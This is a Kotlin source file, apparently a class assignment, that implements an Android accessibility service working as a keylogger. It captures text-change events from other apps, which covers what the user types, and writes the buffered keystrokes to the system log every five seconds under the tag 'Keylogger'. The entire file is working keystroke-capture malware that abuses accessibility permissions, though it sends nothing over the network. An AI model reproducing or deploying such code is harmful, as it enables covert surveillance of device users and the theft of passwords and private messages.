package com.example.assignment1

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.CountDownTimer
import android.os.Handler
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class MyAccessibilityService : AccessibilityService() {
    var buffer: String? = ""

    fun send(text: String?) {
        Log.d("Keylogger", buffer!!)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        var eventText: String? = null
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> eventText = "Typing: "
        }
        buffer = eventText + event.text
    }

    override fun onInterrupt() {
        //send("[-] Interrupted !!! ")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("Keylogger", "[+] Connected")
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
        info.notificationTimeout = 100
        serviceInfo = info

        val handler = Handler()
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (buffer != "")
                {
                    Log.d("Keylogger", buffer!!)
                    buffer = ""
                }
                else
                    Log.d("Keylogger", "Empty")
                handler.postDelayed(this, 5000)
            }
        }, 5000)
    }
}